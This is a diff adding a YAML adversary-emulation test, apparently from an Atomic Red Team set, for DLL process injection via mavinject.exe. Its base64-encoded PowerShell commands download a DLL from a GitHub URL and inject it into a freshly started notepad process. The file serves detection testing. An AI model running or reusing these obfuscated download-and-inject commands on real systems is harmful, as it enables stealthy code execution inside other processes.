@@ -1,0 +1,25 @@
+- id: c15acf49-ec97-5ad9-96b2-a17a466d8244
+  name: Soumaia ART Tests - Process Injection via mavinject.exe
+  description: 'Windows 10 Utility To Inject DLLS.
+
+
+    Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
+
+    With default arguments, expect to see a MessageBox, with notepad''s icon in taskbar. (requires elevation)'
+  tactic: stealth
+  technique:
+    attack_id: T1055.001
+    name: 'Process Injection: Dynamic-link Library Injection'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAwADUANQAuADAAMAAxAC4AZABsAGwAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMAA1ADUALgAwADAAMQAuAGQAbABsACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMAA1ADUALgAwADAAMQAvAHMAcgBjAC8AeAA2ADQALwBUADEAMAA1ADUALgAwADAAMQAuAGQAbABsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABUADEAMAA1ADUALgAwADAAMQAuAGQAbABsACIACgA=
+          }
+          $mypid = (Start-Process notepad -PassThru).id
+          mavinject $mypid /INJECTRUNNING ".\T1055.001.dll"
+          Stop-Process -processname notepad
+        payloads:
+        - T1055.001.dll
